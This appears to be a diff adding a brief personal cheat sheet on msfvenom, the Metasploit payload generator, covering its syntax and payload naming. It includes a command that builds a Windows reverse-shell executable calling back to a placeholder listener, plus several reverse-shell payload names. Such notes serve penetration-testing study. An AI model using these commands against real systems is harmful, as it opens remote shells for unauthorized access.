@@ -1,0 +1,18 @@
+
+standard syntax
+    msfvenom -p <PAYLOAD> <OPTIONS>
+    
+    #example (win64): 
+    
+    msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
+    
+    # -f format -o filename/location
+
+payload naming convention:
+    os/arch/payload
+    example:
+        linux/x86/shell_reverse_tcp
+        windows/x64/meterpreter/reverse_tcp
+    excepion:
+        win32, example:
+            windows/shell_reverse_tcp      
